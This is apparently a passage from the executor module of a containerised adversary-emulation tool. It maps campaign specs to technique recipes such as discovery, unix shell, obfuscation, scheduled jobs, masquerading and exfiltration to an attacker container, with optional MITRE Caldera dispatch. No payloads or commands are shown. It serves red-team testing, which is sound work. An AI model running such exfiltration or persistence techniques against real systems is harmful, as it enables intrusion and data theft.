    campaign_path = (Path(__file__).resolve().parents[2]
                     / "campaigns" / f"{campaign_id}.json")

    def walker(target: DockerEnvironment, attacker: AttackerEnv,
               target_ip: str, run_dir: Path,
               realization: Realization) -> list[TechniqueOutcome]:
        spec = _json.loads(campaign_path.read_text(encoding="utf-8"))
        outcomes: list[TechniqueOutcome] = []
        for tech in spec.get("techniques", []):
            tid = tech["technique_id"]
            name = tech.get("name", "")
            expected_fidelity = tech.get("expected_fidelity")
            if expected_fidelity == "adapted":
                declared = FidelityLevel.adapted
            elif expected_fidelity == "inspired":
                declared = FidelityLevel.inspired
            elif tech.get("platform") in {"linux", "any"} and tid in _ADAPTED_RECIPES:
                # Older campaign specs carry concrete Linux commands but no
                # expected_fidelity field. Treat only recipe-backed, bounded
                # Linux actions as adapted; explicit limitations still win.
                declared = FidelityLevel.adapted
            else:
                declared = FidelityLevel.inspired
            expected_mode = tech.get("expected_mode") or ""

            # Caldera-driven dispatch takes precedence over the local recipe
            # registry when the campaign JSON declares it. This is how a
            # campaign opts into being a real MITRE adversary-emulation run
            # rather than an in-process recipe.
            if expected_mode == "caldera_driven":
                outcomes.append(_caldera_driven(target, tid, run_dir, declared))
                # The dispatch path already filled caldera_ability_* fields,
                # so skip the annotation block below.
                continue

            recipe = _ADAPTED_RECIPES.get(tid) if declared == FidelityLevel.adapted else None
            if recipe == "cert":
                outcomes.append(_adapted_cert(target, tid, run_dir))
            elif recipe == "stage":
                outcomes.append(_adapted_file_artifact(target, tid, run_dir))
            elif recipe == "archive":
                outcomes.append(_adapted_archive_collect(target, tid, run_dir))
            elif recipe == "port_scan":
                outcomes.append(_adapted_port_scan(target, tid, run_dir))
            elif recipe == "network_discovery":
                outcomes.append(_adapted_network_discovery(target, tid, run_dir))
            elif recipe == "service_discovery":
                outcomes.append(_adapted_service_discovery(target, tid, run_dir))
            elif recipe == "user_discovery":
                outcomes.append(_adapted_user_discovery(target, tid, run_dir))
            elif recipe == "file_discovery":
                outcomes.append(_adapted_file_discovery(target, tid, run_dir))
            elif recipe == "unix_shell":
                outcomes.append(_adapted_unix_shell(target, tid, run_dir))
            elif recipe == "obfuscation":
                outcomes.append(_adapted_obfuscation(target, tid, run_dir))
            elif recipe == "hidden_artifact":
                outcomes.append(_adapted_hidden_artifact(target, tid, run_dir))
            elif recipe == "scheduled_job":
                outcomes.append(_adapted_scheduled_job(target, tid, run_dir))
            elif recipe == "masquerade":
                outcomes.append(_adapted_masquerading(target, tid, run_dir))
            elif recipe == "crm_query":
                outcomes.append(_adapted_crm_query(target, attacker, target_ip, tid, run_dir))
            elif recipe == "exfil":
                outcomes.append(_adapted_exfil(target, attacker, target_ip, tid, run_dir))
            else:
                # No adapted recipe registered -> inspired marker, with the
                # manifest preserving the declared/executed gap if relevant.
                inspired = _c0011_inspired(tid, name, target, run_dir)
                inspired.declared_fidelity = declared
                outcomes.append(inspired)

            # Annotate every outcome with a Caldera ability id if MITRE
            # Caldera (with the atomic plugin) ships an ability for this
            # technique. This makes our manifest auditable against the
            # canonical ART corpus even when we executed the technique with
            # our own recipe.
            last = outcomes[-1]
            ability = caldera_client.best_ability_for(tid)
            if ability:
                last.caldera_ability_id = ability.get("ability_id")
                last.caldera_ability_name = ability.get("name")
                # When the technique was declared real_controlled AND
                # Caldera carries an atomic for it, we record the executed
                # mode as `atomic_red_team`. The recipe still produced the
                # local evidence; the canonical ART id is now in the manifest.
                if last.declared_mode == ExecutionMode.real_controlled:
                    last.executed_mode = ExecutionMode.atomic_red_team
        return outcomes

    return walker


_ALL_CAMPAIGN_IDS = (
    "0.c0010", "0.c0011", "0.c0012", "0.c0013", "0.c0015", "0.c0017", "0.c0026",
    "0.apt41_dust", "0.apt41_dust_full",
    "0.costaricto",
    "0.outer_space",
    "0.operation_midnighteclipse",
    "0.salesforce_data_exfiltration",
    "0.caldera_linux_demo",
    "0.fin6_emulation",
    "0.dmz_segmentation_demo",
)

CAMPAIGN_WALKERS: dict[str, CampaignWalker] = {
    "0.shadowray": _shadowray_walker,
    **{cid: _campaign_aware_walker(cid) for cid in _ALL_CAMPAIGN_IDS},
}


def execute(campaign_id: str, target: DockerEnvironment, attacker: AttackerEnv,
            target_ip: str, run_dir: Path,
            realization: Realization) -> list[TechniqueOutcome]:
    walker = CAMPAIGN_WALKERS.get(campaign_id)
    if walker is None:
        raise NotImplementedError(
            f"No executor for {campaign_id}. Add a walker in executor.py."
        )
    return walker(target, attacker, target_ip, run_dir, realization)
